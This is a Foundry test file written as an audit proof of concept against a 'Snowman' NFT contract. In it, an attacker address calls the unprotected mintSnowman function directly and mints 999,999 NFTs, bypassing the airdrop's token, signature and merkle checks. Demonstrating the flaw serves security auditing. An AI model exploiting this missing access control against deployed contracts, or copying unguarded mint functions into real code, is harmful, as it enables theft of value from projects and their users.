// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Snowman} from "../../src/Snowman.sol";

contract TestAuditPoC is Test {
    Snowman public snowman;

    address attacker = makeAddr("attacker");

    function setUp() public {
        // Snowman's constructor only needs the SVG URI string —
        // any placeholder string works fine for testing purposes
        snowman = new Snowman("data:image/svg+xml;base64,PLACEHOLDER");
    }

    function test_H01_mintSnowman_hasNoAccessControl() public {
        // Attacker has zero Snow tokens, no signature, no merkle proof —
        // they call Snowman directly, completely bypassing SnowmanAirdrop
        vm.prank(attacker);
        snowman.mintSnowman(attacker, 999_999);

        // If this line is reached without reverting, the attacker
        // now owns 999,999 NFTs for free
        assertEq(snowman.balanceOf(attacker), 999_999);
    }
}